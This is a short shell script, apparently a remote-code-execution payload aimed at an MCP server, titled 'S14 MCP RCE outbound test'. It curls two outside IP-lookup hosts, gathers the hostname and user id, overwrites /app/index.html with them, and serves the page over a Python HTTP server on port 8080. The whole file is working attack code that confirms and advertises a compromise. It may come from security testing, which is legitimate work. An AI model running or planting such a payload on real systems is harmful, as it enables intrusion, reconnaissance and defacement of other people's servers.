#!/bin/sh
# S14 MCP RCE outbound test
OUT1=$(curl -s --max-time 8 http://checkipv4.aiven.live/ 2>&1 | head -c 120)
OUT2=$(curl -s --max-time 8 https://api.ipify.org 2>&1 | head -c 60)
HOST=$(hostname)
UIDV=$(id -u)
echo "RCE host=$HOST uid=$UIDV" > /app/index.html
echo "out1=$OUT1" >> /app/index.html
echo "out2=$OUT2" >> /app/index.html
exec python3 -m http.server 8080
